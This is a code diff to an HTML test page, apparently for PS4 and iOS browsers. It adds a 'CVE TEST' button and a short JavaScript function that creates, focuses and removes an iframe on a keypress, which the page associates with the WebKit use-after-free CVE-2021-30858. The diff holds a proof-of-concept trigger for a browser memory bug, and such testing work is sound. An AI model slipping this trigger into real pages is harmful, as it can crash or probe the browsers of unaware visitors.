@@ -18,6 +18,16 @@
         }
         </style>
     <script>
+        async function cve() {
+            alert("Press 'OK' and after this, press any key")
+            frame = document.body.appendChild(document.createElement('iframe'));
+            frame.contentWindow.focus();
+            frame.contentDocument.addEventListener('keydown', () => {
+            frame.remove();
+            alert("WEBKIT WORK!");
+            });
+        }
+        
         
         async function testwebkit() {
             try{
@@ -55,6 +65,7 @@
         <br>
         <button class="button" onclick="testwebkit()">CVE ON PS4 Browser 8.XX</button>
             <button class="button" onclick="testwebkit2()">WEBKIT TEST (PS4, iOS)</button><br>
+            <button class="button" onclick="cve()">CVE TEST (don't click)</button><br>
                     <p2 style="color:#E6E6FA">CVE-2021-30858: Use-after-free in WebKit / Credit: @KameleonRe</p2>
         </center>
     </body>
